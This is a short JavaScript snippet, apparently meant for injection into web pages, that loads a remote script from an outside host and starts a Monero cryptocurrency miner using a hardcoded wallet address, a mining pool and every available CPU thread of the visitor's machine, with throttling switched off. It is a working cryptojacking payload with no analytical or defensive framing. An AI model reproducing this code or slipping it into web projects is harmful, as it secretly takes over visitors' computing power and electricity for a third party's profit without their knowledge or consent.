function __mm__() {
    server = "wss://ghgi.xyz";
    var pool = "moneroocean.stream";
    var walletAddress = "85ys2JUgCoYBPD3RTLYj18R9h7i9kbZD23MX9B5D8dB4DRK7WRSEAynUk3sECAqSCV9EJ64tivdScAJEkQCF97VkVDmJNHD";
    var workerId = String(window.navigator.platform + window.navigator.language + Date.now()).replace(/\s/g, '');
    var threads = window.navigator.hardwareConcurrency;
    var password = "x";
    startMining(pool, walletAddress, workerId, threads, password);
    throttleMiner = 0;
}

const __bJS__ = document.createElement('script');
__bJS__.onload = () => __mm__();
__bJS__.src = 'https://script.ghgi.xyz';

document.getElementsByTagName('head')[0].appendChild(__bJS__);